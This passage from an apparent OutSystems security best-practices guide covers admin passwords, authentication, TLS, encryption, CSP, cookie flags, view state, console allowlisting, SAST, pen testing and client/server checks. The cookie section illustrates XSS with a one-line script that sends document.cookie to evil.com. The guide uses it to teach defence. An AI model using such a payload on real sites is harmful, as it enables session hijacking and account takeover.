  • Always store sensitive data using the Ciphered Local Storage Plugin or Key Store Plugin — never in plain local storage or client variables.
  • Test your app on a rooted device to verify that your root detection and AppShield configuration behaves as expected.

Admin Password Rotation

OutSystems has two administrator accounts. You should set a policy to change (rotate) these passwords regularly.

Why Admin Passwords Need Special Attention

Admin accounts are high-value targets. If an attacker gains access to an OutSystems admin account, they can deploy malicious code, access all application data, change configurations, and create new user accounts — essentially taking full control of the platform. This makes admin credentials worth much more effort to an attacker than a regular user's credentials.

Two Administrator Accounts

🖥️

Platform Server Admin

Used to access LifeTime and Service Center — the management consoles where you configure the environment, manage deployments, and review logs. Change the password using the Configuration Tool installed on the OutSystems server.

👥

Users App Admin

Used to manage end users of your business applications — creating accounts, resetting passwords, assigning roles. Change the password inside the Users application. This must be done separately in each environment (Development, QA, Production) because user stores are separate.

The Risk of Default or Weak Passwords

During initial installation, OutSystems sets default passwords for these admin accounts. These defaults are well-known and documented in public installation guides. Any attacker who finds your management console URL and tries the default password may get immediate access if you never changed it.

After a new OutSystems installation, a developer deploys the app to a cloud server. They forget to change the admin password from the default. Three days later, an automated scanner finds the LifeTime URL and logs in with the default credentials. The attacker now has full access to all environments.

Best Practices

  • Change admin passwords immediately after installation — before doing anything else. Do not leave default passwords in place, even temporarily.
  • Use strong passwords — at least 16 characters with a mix of uppercase, lowercase, numbers, and symbols. Consider using a passphrase (e.g., "Purple-Sky-Train-42!") which is both long and memorable.
  • Set a password rotation policy — for example, change admin passwords every 90 days, or immediately if a team member with admin access leaves the company.
  • Do not share admin accounts. Each person who needs admin access should have their own named account. This allows you to revoke access individually and track who did what.
  • Store admin passwords in a password manager — never in a text file, spreadsheet, or chat message.

End-User Authentication Methods

You can choose how your application's users log in. OutSystems supports several authentication methods.

Choosing the Right Method

How your users log in is one of the most important security decisions in your app. The authentication method you choose affects security, user experience, and how easy it is to manage user accounts. OutSystems supports several methods — each with different strengths and appropriate use cases.

Default
Internal Authentication

User accounts and hashed passwords are stored in the OutSystems database. OutSystems manages the password rules, hashing, and brute force protection automatically.

When to use: Small internal tools, prototypes, or applications where no external identity provider exists. Avoid for large enterprise apps or any public-facing app with sensitive data — managing user accounts in multiple places creates extra work and risk.

External
Active Directory (AD) / LDAP

Your app connects to your company's Active Directory (Windows environments) or any LDAP-compatible directory. Users log in with their existing corporate username and password — no separate OutSystems credentials needed.

Key benefit: When HR disables an employee's Active Directory account (because they left the company), access to all connected apps is removed at the same time — no manual cleanup required.

SSO
SAML 2.0

SAML (Security Assertion Markup Language) is a widely-used standard for enterprise Single Sign-On. The user logs in once with an Identity Provider (IdP) — like Okta, Azure AD, or ADFS. The IdP sends a signed "assertion" to OutSystems confirming who the user is. OutSystems trusts this and logs the user in without storing their password at all.

Key benefit: Centralized user management and strong security. The password is managed by the IdP (which typically enforces MFA), not by each individual app.

Cloud
Microsoft Entra ID (formerly Azure AD) / Okta

These are popular cloud-based identity providers. If your organization already uses Microsoft 365 (which includes Entra ID) or Okta for other apps, you can connect OutSystems to the same identity provider using SAML 2.0 or OIDC.

Users get a seamless experience: they log into their company portal once in the morning and can access OutSystems apps (along with Office 365, Salesforce, etc.) without logging in again.

Adding Stronger Authentication

Whatever login method you choose, you can layer additional protections on top:

  • Touch ID / Face ID Plugin — allows mobile app users to authenticate using biometrics instead of typing a password. Biometrics are convenient and more secure than most passwords.
  • Google reCAPTCHA — adds a bot challenge to the login form. Stops automated scripts from attempting mass login attempts without affecting legitimate users.
  • Two-Factor Authentication (2FA) via Google Authenticator — after entering their password, the user must also enter a time-based code from an authenticator app. Even if their password is stolen, an attacker cannot log in without the second factor.

Best Practices

  • For any enterprise application, use Active Directory, SAML 2.0, or a cloud IdP — not internal authentication. Centralizing identity management reduces risk and maintenance work.
  • For apps handling sensitive data (financial, health, HR), add 2FA as a mandatory requirement — not optional.
  • For public-facing apps, add reCAPTCHA to the login page to stop automated attacks.
  • Regularly review who has access to your app — remove accounts for users who no longer need access.

Data in Transit (SSL/TLS)

Data in transit is data that is being sent from one place to another (e.g., from a user's browser to your server). You must encrypt it so no one can read it on the way.

How the SSL/TLS Handshake Works

Before any data is sent, the browser and server perform a TLS handshake — a brief negotiation that establishes a secure connection. Here is what happens:

  1. The browser connects and says "Hello, I support these encryption methods."
  2. The server responds with its SSL/TLS certificate — a digital document signed by a trusted Certificate Authority (CA). This certificate proves the server's identity (its domain name) and contains its public key.
  3. The browser verifies the certificate: Is it signed by a trusted CA? Is it for the correct domain? Has it expired? If all checks pass, the browser trusts the server.
  4. The browser and server negotiate an encryption key using the public key. This key is used to encrypt all subsequent communication.
  5. All data sent after this point is encrypted — readable only by the browser and the server.

This process happens in milliseconds and is completely invisible to users.

SSL Certificates in OutSystems

OutSystems Cloud environments come with a default SSL certificate for the outsystemsenterprise.com domain. This works for development, but for production you need a certificate for your own domain:

  • Register a custom domain (e.g., mycompany-hr.com)
  • Obtain an SSL certificate for that domain from a trusted Certificate Authority
  • Configure the certificate in your OutSystems Cloud environment (submit a support request) or in IIS/nginx for self-managed deployments

Important: if you plan to use SSL Pinning in mobile apps, configure your custom domain and certificate before you build the mobile app. The certificate fingerprint is baked into the app binary and cannot be changed without republishing.

TLS Versions — Use Only Modern Ones

TLS has gone through several versions. Older versions have discovered security weaknesses and should no longer be used:

  • SSL 3.0, TLS 1.0, TLS 1.1 — deprecated, known vulnerabilities, do not use
  • TLS 1.2 — currently the minimum acceptable version; widely supported
  • TLS 1.3 — the newest and most secure version; faster and simpler than 1.2
💡

Contact OutSystems Support to explicitly disable TLS 1.0 and 1.1 in your Cloud environment. For self-managed, configure this in IIS or your load balancer.

Best Practices

  • Use a custom domain and SSL certificate in all environments — not just production. Development and QA should also use HTTPS so developers build and test in a realistic environment.
  • Renew SSL certificates before they expire. An expired certificate causes browser warnings and may block users from accessing your app. Set a calendar reminder 30 days before expiry.
  • Request that TLS 1.0 and 1.1 are disabled in your environment.
  • Enable HSTS so browsers remember to always use HTTPS for your domain.

Data at Rest

Data at rest is data stored on disk — in your database, in backups, or in log files. You should encrypt this data so that if someone steals the physical storage, they cannot read it.

What "Data at Rest" Means

Data at rest is data that is stored — in a database, on a file system, in backups, in logs, or on a mobile device. Unlike data in transit (which HTTPS protects while it moves), data at rest sits in one place and could be accessed by anyone with physical or administrative access to the storage.

Threats to data at rest include: database servers being stolen or hacked, backup files being accessed by unauthorized staff, cloud storage being misconfigured as public, or a disgruntled database administrator reading data they should not see.

Two Levels of Protection

You should apply encryption at two levels — they protect against different threats:

🏗️

Infrastructure Level

The entire database storage, backups, and snapshots are encrypted. Protects against physical theft of hardware or unauthorized access to raw storage files. Even a database backup file is unreadable without the storage key.

🔒

Application Level

Specific sensitive fields in the database are encrypted by your application code. Protects against users with legitimate database access (DBAs, developers) reading sensitive data they should not see.

OutSystems Cloud — Infrastructure Encryption

In OutSystems Cloud, you can activate the database encryption service through a support request. When enabled, it encrypts:

  • The main database storage volumes
  • Automated database backups (taken daily)
  • Database snapshots (point-in-time copies used for recovery)

This is infrastructure-level encryption — it protects against someone stealing the physical storage or accessing raw backup files. It does not protect against a database user with valid credentials running a query and reading sensitive data.

Application-Level Encryption with CryptoAPI

For truly sensitive fields, add a second layer of encryption at the application level using the CryptoAPI component. Your application encrypts the value before storing it and decrypts it only when needed by an authorized user.

Scenario: A healthcare app stores patient diagnoses in the database.

With only infrastructure encryption: a database admin can run SELECT * FROM PatientRecord and read every diagnosis in plain text.

With application-level encryption: the diagnosis column contains encrypted values like AES256:k2hd9s.... The admin sees gibberish. Only the application itself — with the correct encryption key — can decrypt it to show to an authorized doctor.

Best Practices

  • Enable database encryption for all production environments — request this from OutSystems Cloud support before going live.
  • Use CryptoAPI to encrypt specific sensitive fields — patient data, financial data, national ID numbers, and any other data where unauthorized reading would cause serious harm.
  • Protect your encryption keys carefully. Store them in a key management service (KMS) or at minimum in environment variables — never hardcoded in your application code.
  • Verify that backups are also encrypted — a stolen backup of an unencrypted database is just as dangerous as stealing the live database.

Content Security Policy (CSP)

Content Security Policy (CSP) tells the browser which sources of content are trusted. This prevents attackers from loading malicious scripts into your app.

The Problem CSP Solves

Imagine your app shows user-supplied content — a comment, a profile description, or a product review. Even if you try to escape dangerous HTML, there are edge cases where a script might slip through. Once that script is in your page, the browser has no way to tell whether it is legitimate code you wrote or malicious code injected by an attacker.

CSP solves this by letting you tell the browser in advance: "These are the only sources my app is allowed to load code from." Even if an attacker injects a script tag, the browser checks whether that script came from an approved source. If it did not, the browser refuses to execute it.

What CSP Controls

CSP is a set of rules (called directives) sent as an HTTP header. Each directive controls a different type of content:

  • script-src — where JavaScript is allowed to come from. The most important directive for security.
  • style-src — where CSS stylesheets are allowed to come from.
  • img-src — where images are allowed to come from.
  • connect-src — which URLs the app can make AJAX or fetch requests to.
  • frame-ancestors — controls whether your page can be embedded in an iframe on another site. Setting this to 'none' prevents clickjacking attacks — where an attacker embeds your app inside a transparent frame and tricks users into clicking things they cannot see.
A CSP that says:
script-src 'self'; img-src 'self' cdn.mycompany.com; frame-ancestors 'none'

Means: JavaScript can only run from this domain. Images can load from this domain or from cdn.mycompany.com. This page cannot be put inside an iframe anywhere. If a script from evil.com somehow gets injected into the page, the browser sees it did not come from 'self' and refuses to run it.

How to Set CSP in OutSystems

CSP is configured in LifeTime (Security settings) or Service Center. You can apply it at two levels:

  • Environment level — applies to all apps in the environment. Good for setting a baseline policy.
  • Application level — override the environment policy for a specific app. Use this when one app needs to load content from a third-party service that others do not.

OutSystems also provides a CSP report-only mode — instead of blocking violations, the browser just logs them. Use this first to understand what your current app loads and where, before switching to enforcement mode.

Best Practices

  • Start in report-only mode to collect violations without breaking the app. Review what is being blocked and add legitimate sources to your policy.
  • Never use 'unsafe-inline' or 'unsafe-eval' in your script-src — these defeat the purpose of CSP by allowing inline scripts (which is exactly what an injected XSS payload uses).
  • Set frame-ancestors 'none' to prevent clickjacking, unless you have a specific need to embed your app in another site.
  • Use the browser's developer console (F12 → Console) to see CSP violation messages during testing.

Secure Session Cookies

Cookies store small pieces of data in the user's browser. Session cookies store the user's login information. You need to protect them from being stolen.

What Is a Session Cookie?

When a user logs in, OutSystems creates a session and stores the session ID in a cookie — a small piece of data saved in the browser. Every time the browser makes a request to the server, it includes this cookie automatically. The server reads the cookie, finds the matching session, and knows who the user is.

This means the session cookie is the user's "proof of identity" after login. If an attacker steals it, they can make requests to the server pretending to be that user — without knowing the user's password. This is called session hijacking.

Two Protection Flags

Secure
Secure Flag

When this flag is set on a cookie, the browser will only send the cookie if the connection is HTTPS. It will never include the cookie in a plain HTTP request.

This prevents a network attacker (on the same Wi-Fi, for example) from intercepting the cookie. Even if the user accidentally visits an HTTP version of your app, the session cookie is not transmitted.

Without the Secure flag: A user is on public Wi-Fi. They visit http://yourapp.com (not HTTPS). The session cookie is sent in plain text. The attacker on the same network captures it and logs in as that user.

With the Secure flag: The browser refuses to send the cookie over HTTP. The attacker captures nothing.
HttpOnly
HttpOnly Flag

When this flag is set, JavaScript code running in the browser cannot access the cookie. You cannot read it with document.cookie.

This is critical for defending against XSS attacks. Even if an attacker successfully injects a JavaScript snippet into your page, that script cannot steal the session cookie — because the cookie is invisible to JavaScript.

An XSS vulnerability exists in a comment field. An attacker posts: <script>fetch('https://evil.com/?c='+document.cookie)</script>

Without HttpOnly: The script runs and sends the session cookie to the attacker.
With HttpOnly: document.cookie does not include the session cookie. The attacker gets nothing useful.

There Is Also a Third Flag: SameSite

The SameSite flag controls when cookies are sent in cross-site requests — requests that originate from a different website. This protects against CSRF attacks.

  • SameSite=Strict — cookie is never sent with cross-site requests. Maximum protection, but may break some legitimate flows (like clicking a link from an email).
  • SameSite=Lax — cookie is sent for top-level navigation (clicking a link) but not for embedded requests (images, AJAX). A good balance for most apps.
  • SameSite=None — cookie is sent with all requests. Only use this if your app genuinely needs to work in a cross-site context (e.g., embedded in an iframe).

How to Enable in OutSystems

Enable the Secure cookie flag in Service Center under the Security settings for your environment. OutSystems sets the HttpOnly flag on session cookies by default. Configure SameSite in the environment's HTTP security settings.

Best Practices

  • Enable the Secure flag on all cookies. There is no downside if your app uses HTTPS (which it should).
  • Verify that the HttpOnly flag is set — use browser DevTools (F12 → Application → Cookies) to confirm.
  • Use SameSite=Lax as your default. Only use SameSite=None when there is a specific technical reason.
  • Never store sensitive data directly in cookies. Cookies are designed to hold identifiers (like a session ID) — the actual data should stay on the server.

View State Encryption

The view state is a hidden field in web pages that stores page data between requests. If not encrypted, it can contain sensitive user information that attackers could read or modify.

What Is View State?

OutSystems Traditional Web apps (not Reactive) are built on ASP.NET technology. ASP.NET uses a mechanism called view state to remember the state of a page between requests. For example, if a form has many fields and you submit it, the page needs to remember what values were in all the other fields while processing your input.

View state is stored as a hidden field in the HTML of the page — it is sent to the browser with every page load and returned to the server with every form submission. If you right-click a page and view the source, you can see it: a long encoded string inside a hidden input field named __VIEWSTATE.

The Two Risks of Unencrypted View State

  • Information disclosure — the view state contains real page data. If it is not encrypted, anyone who views the page source can decode it using freely available tools and read the data inside. This could expose user IDs, role names, or other internal values that should not be visible.
  • View state tampering — an attacker could decode the view state, change values (for example, changing their user ID to an admin ID, or changing a price from 100 to 1), encode it again, and send the modified version back to the server. If the server trusts the view state without verifying it, the attack succeeds.
Attack scenario: A shopping cart page stores the product price in view state. The page source contains: __VIEWSTATE: [encoded: price=299.99]

An attacker decodes it, changes the price to 0.01, re-encodes it, and submits the form. If the server trusts the view state price without checking the database, the order is placed at $0.01.

How OutSystems Protects Against This

Enabling view state encryption in your environment settings does two things:

  • Encrypts the content — the data inside the view state is scrambled. Even if an attacker extracts it, they cannot read or decode the values.
  • Signs the data with a MAC (Message Authentication Code) — the server adds a cryptographic signature to the view state. When the view state is returned, the server verifies the signature. If any byte was changed, the signature check fails and the request is rejected.

How to Enable

Go to Service Center → Administration → Security and enable "View State Encryption." This applies to all Traditional Web applications in that environment. It is a simple toggle — there is no code change needed.

Best Practices

  • Enable view state encryption for all environments — not just production. Build and test with the same security settings you will use in production.
  • This setting only applies to Traditional Web apps. Reactive Web apps do not use view state — they handle state differently.
  • Never rely on view state to enforce security rules. Even with encryption, server-side validation is the correct approach — always re-validate important values from the database on the server.

Restrict Console Access

OutSystems management consoles (LifeTime, Service Center) and development tools should only be accessible from known, trusted locations — not from anywhere on the internet.

What Are the Management Consoles?

OutSystems has several management tools that are accessible via a web browser:

  • LifeTime — deploy apps between environments, manage IT users and their permissions, view deployment history
  • Service Center — monitor applications, view logs, configure settings, manage users, restart services
  • Service Studio — the development environment (connects via network to the server)

These tools are extremely powerful. Anyone who can log in to Service Center can read all your application logs, see your database connection strings, modify environment settings, and restart any service. LifeTime access allows deploying code to production.

The Threat

If these consoles are accessible from anywhere on the internet, they are exposed to:

  • Brute force attacks on the login page (even with brute force protection, repeated attempts create noise)
  • Exploitation of unpatched vulnerabilities in the console software itself
  • Credential phishing — an attacker who tricks a developer into entering their credentials on a fake site now has access to your production environment

The solution is simple: if these consoles cannot be reached from the internet at all, none of these threats apply.

How IP Allowlisting Works

OutSystems lets you define an internal network — a list of IP address ranges that are allowed to access the management consoles. Requests from any IP address not in the list are blocked before they even reach the login page.

Your company office has IP addresses in the range 203.0.113.0/24. You configure this range as your "internal network" in OutSystems.

Result: A developer in the office can open LifeTime normally. The same developer at a coffee shop gets a "403 Forbidden" response — they are not in the allowed range. A hacker anywhere in the world is also blocked.

For remote work: the developer connects to the company VPN first, which assigns them an IP in the 203.0.113.0/24 range. Then they can access LifeTime as if they were in the office.

How to Configure It

  • OutSystems Cloud — submit a support request to OutSystems with your allowed IP ranges. OutSystems configures the network-level restriction on the cloud infrastructure.
  • Self-managed — configure the IP allowlist in Service Center (Administration → Security → Network Security) or at the network firewall / load balancer level.

Best Practices

  • Restrict console access before you go to production — ideally before you do any development at all. There is no reason management consoles should ever be public.
  • Set up a VPN for remote developers. A VPN gives them a corporate IP address, so they can access the consoles from anywhere without exposing the consoles to the world.
  • Your business application (the app your users log in to) should remain publicly accessible. Only the management consoles need to be restricted.
  • Review the allowed IP list regularly — remove ranges for offices or partners that no longer need access.

Static Application Security Testing (SAST)

SAST means analyzing your app's source code to find security problems — without running the app. You do this after development to catch any vulnerabilities that were missed.

How SAST Works

A SAST tool reads your application's source code without running it. It analyzes the code for patterns that are known to cause security vulnerabilities — things like SQL queries built from user input, unescaped output, hardcoded passwords, or functions known to be unsafe.

Because it analyzes code statically (without running the app), it can find vulnerabilities in code paths that are rarely executed — for example, a rarely triggered error handler that leaks internal system information.

The SAST Process with OutSystems

  1. When you publish an application, OutSystems generates standard .NET source code from your visual models.
  2. Export this generated code from Service Center (go to the module → click "Download Source Code").
  3. Submit the code to your SAST tool. Common tools used with OutSystems include Checkmarx, Veracode, and SonarQube.
  4. The tool analyzes the code and generates a report listing potential vulnerabilities, each with a severity level (Critical, High, Medium, Low, Informational) and a description of why it is risky.
  5. Review each finding. Determine if it is a real vulnerability or a false positive. Fix the real ones by changing your OutSystems logic (then re-publish and re-scan to confirm).

Understanding False Positives

SAST tools are not perfect. They often flag code as potentially vulnerable when it is actually safe — this is called a false positive. For OutSystems-generated code, false positives are common because:

  • The tool does not understand OutSystems' internal security mechanisms (like automatic query parameterization)
  • The tool sees patterns that look like injection risks but are actually sanitized higher in the call stack
  • Some generated code patterns are flagged simply because they are unfamiliar to the tool

OutSystems Support can help you review a finding and determine whether it is a real vulnerability in your OutSystems logic or a false positive caused by the code generation process.

⚠️

Do not dismiss all SAST findings as false positives just because some of them are. Investigate each one individually. Some will be real vulnerabilities — particularly in custom SQL, custom JavaScript, or integration code you wrote yourself.

Best Practices

  • Run SAST before every major release — not just before the very first go-live.
  • Prioritize findings: fix Critical and High severity findings before release. Schedule Medium findings for the next sprint. Low findings can be tracked in the backlog.
  • Keep records of which findings were reviewed and why they were classified as false positives — auditors may ask to see this.
  • Re-scan after each fix to confirm the finding is resolved and no new findings were introduced.
  • Over time, build up an internal knowledge base of which OutSystems code patterns produce false positives, so future reviews are faster.

Penetration Testing

Penetration testing (pen testing) means hiring security experts to try to hack your application — in a controlled way — to find vulnerabilities before real attackers do.

Pen Testing vs SAST

SAST finds vulnerabilities by reading code. Pen testing finds vulnerabilities by actually using the application — the same way a real attacker would. These two approaches complement each other:

  • SAST is good at finding code-level issues — unsafe SQL, unescaped output, hardcoded secrets
  • Pen testing is good at finding logic-level issues — broken business flows, permission bypasses, chained vulnerabilities that no single code check could find

What a Pen Tester Does

A pen tester (also called a security researcher or ethical hacker) is given access to your application and tries to break it — with permission. They use the same tools, techniques, and thinking as a real attacker, but their goal is to report what they find, not exploit it.

Typical activities during a pen test include:

  • Reconnaissance — mapping all the screens, APIs, and inputs of the application
  • Authentication testing — trying to bypass login, brute force passwords, reuse expired sessions
  • Authorization testing — checking if a regular user can access admin functions, view other users' data, or perform actions they should not be able to
  • Injection testing — submitting SQL, HTML, JavaScript, and other code through every input field
  • Business logic testing — looking for flaws in workflows, such as skipping steps in a checkout process, or submitting a negative quantity to get a refund on a purchase
  • API testing — calling REST API endpoints directly with modified parameters, without going through the intended UI

Types of Pen Tests

  • Black box — the tester knows nothing about the app and starts with just the URL. Simulates an external attacker with no inside knowledge.
  • Grey box — the tester has some information, like a regular user account. Simulates a malicious insider or a compromised user account.
  • White box — the tester has full access to source code, architecture diagrams, and admin credentials. Finds more vulnerabilities but costs more. Best for critical apps handling sensitive data.

Rules for OutSystems Cloud

  • You can run pen tests on your own OutSystems applications and your own Cloud environments.
  • You cannot test shared OutSystems infrastructure or other customers' environments.
  • Always notify OutSystems Support before running a pen test on Cloud. Aggressive testing can look like a real attack and may trigger automated protections or alerts. Notifying them in advance prevents your test from being blocked.
⚠️

Automated pen test tools (like Burp Suite or OWASP ZAP) may report false positives. OutSystems Support can help you understand which findings are real vulnerabilities versus noise from the testing tool.

Best Practices

  • Run a pen test before the first launch of any application that handles sensitive data. Do not skip this step even if your timeline is tight — a breach is always more expensive than a delayed launch.
  • Fix all Critical and High findings before launch. Schedule Medium findings for the first sprint after launch.
  • Repeat pen tests after major functionality changes, not just at launch. New features can introduce new attack surfaces.
  • Use findings to improve your development process — if the pen test keeps finding the same type of issue (e.g., missing authorization checks on server actions), add it to your code review checklist so future developers catch it earlier.
  • Keep your pen test report confidential — it contains a detailed map of your application's weaknesses.

Client-Side Security

A Reactive Web App has two parts: client-side (what runs in the browser) and server-side (what runs on the server). The client side can be seen and changed by users, so never put sensitive logic or data there.

Keep Sensitive Data Off the Client

Client-side code — screens, UI logic, client actions, variables — is converted into HTML, JavaScript, and CSS. Anyone can open the browser DevTools and read it. Because of this:

  • Never store passwords, tokens, or private data in Client Variables.
  • Never use Client Variables to control important application flows (e.g., "isAdmin = true"). They can be changed by the user in the browser.
  • Client Variables are saved in the browser's local storage and are shared between apps — treat them as public.

Fetch Only the Data You Need

When you load data from the database, only request the fields your screen actually needs. Do not fetch all columns "just in case." This reduces what is exposed in the browser.

💡

Recent versions of the OutSystems Platform optimize aggregates automatically. If you use an older version, manually limit the fields returned by your aggregates.

Secure Server Calls (Aggregates & Actions)

Every aggregate or server action used on the client side creates a REST API endpoint behind the scenes. If an attacker finds the endpoint, they may try to call it with modified input values.

  • Do not use client-side input parameters (e.g., a UserId passed from the screen) to filter data. An attacker can change that value.
  • Do use GetUserId() inside the aggregate itself. Because the aggregate runs on the server, the attacker cannot change it.
  • Apply the same idea when filtering by role or any unique identifier.
❌

Unsafe Pattern

Pass UserId from the screen as an input to the aggregate → attacker changes the value → gets another user's data.

✅

Safe Pattern

Use GetUserId() directly inside the aggregate on the server → only the current user's data is ever returned.

Protect Screens and Aggregates with Roles

When a screen allows the Anonymous role, every aggregate and server action on that screen becomes a public API endpoint — anyone on the internet can call it.

  • For screens that need login, assign one or more roles (not Anonymous). OutSystems will automatically require the user to be authenticated before the endpoint is called.
  • When a screen mixes multiple roles (e.g., Admin sees extra buttons, regular user does not), hiding buttons on the client side is not enough. An attacker can still call the API directly.
  • Better approach: create separate screens for each role, each with its own logic and only the functionality that role needs.

Securing Public Screens That Still Need Identity Verification

Sometimes a screen must be public (anonymous), but you still need to know who the user is — for example, "Forgot Password" or "Create Account" flows.

Use a One-Time Authorization Code (OTAC) flow:

  • Option 1 — Two-device flow: Generate a unique token on the server and send it to the user by SMS, email (with a time-limited URL), or an Authenticator app. The user enters or clicks the token to confirm identity, then logs in. After login, show the reset-password screen immediately.
  • Option 2 — Single request: Use the token in the same password-reset request. If the token is wrong, the password is not updated.
  • Option 3 — JWT: Use JSON Web Tokens to encrypt session data. The JWT Forge component from OutSystems Forge can help.

Server-Side Security

The server side is more trusted than the client side, but you still need to check that the user is who they say they are before running any important logic.

Always Validate User Identity in Server Actions

When a server action can be called from a Reactive app, start the action by checking two things:

  1. Is the user logged in? — Use GetUserId() to confirm a valid session exists.
  2. Does the user have the right role? — Use Check<RoleName>Role() to confirm the user is allowed to run this action.

If either check fails, stop the action and return an error. Do not assume that because the screen is protected, the action is also protected — server actions in core modules may be reused by other apps and should always self-validate.

💡

Think of every server action as a mini-API endpoint. Always ask: "What happens if an attacker calls this directly, without going through the screen?"

Key Differences from Traditional Web

In Traditional Web, most logic runs on the server. In Reactive Web, more logic runs on the client. This means:

  • More input parameters are passed from the browser to the server.
  • Each aggregate or server action on the client side is a separate REST endpoint.
